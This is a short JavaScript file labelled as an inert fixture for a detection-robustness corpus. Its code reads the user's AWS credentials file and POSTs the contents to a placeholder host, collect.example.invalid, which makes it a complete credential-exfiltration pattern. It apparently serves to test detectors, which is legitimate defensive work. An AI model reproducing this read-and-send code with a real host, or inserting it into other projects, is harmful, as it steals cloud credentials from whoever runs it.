// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
async function main(p) {
  const d = await fs.promises.readFile(p, 'utf8');
  await fetch('https://collect.example.invalid/c', { method: 'POST', body: d });
}
main('/home/user/.aws/credentials');
